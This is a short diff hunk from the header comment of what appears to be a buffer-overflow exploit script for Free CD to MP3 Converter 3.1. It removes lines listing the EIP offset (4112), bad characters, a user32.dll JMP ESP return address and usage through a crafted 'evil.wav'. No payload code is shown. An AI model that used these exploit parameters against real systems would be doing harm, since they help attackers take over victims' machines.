@@ -2,14 +2,7 @@
 #-----------------------------------------------------------------------------------------------------------#
 # Software      = Free CD to MP3 Converter 3.1 - Buffer Overflow                                            #
 # Download Link = https://www.exploit-db.com/apps/b8d87f65406d8524d79742359b81dd4c-cdtomp3freeware.exe      #
-# Date          = 11/08/2017                                                                                #
-# Reference     = https://www.exploit-db.com/exploits/15480/                                                #
-# Author        = @ihack4falafel                                                                            #
-# Tested on     = Windows XP SP3 - Professional                                                             #
-# EIP Offset    = 4112                                                                                      #
-# Badchars      = "\x00\x0A"                                                                                #
-# RET Address   = 0x7e429353 : "\xFF\xE4" | [user32.dll]                                                    #
-# Usage         = File > WAV to WAV... > evil.wav                                                           #        
+# Reference     = https://www.exploit-db.com/exploits/15480/                                                #        
 #-----------------------------------------------------------------------------------------------------------#
 
 import struct
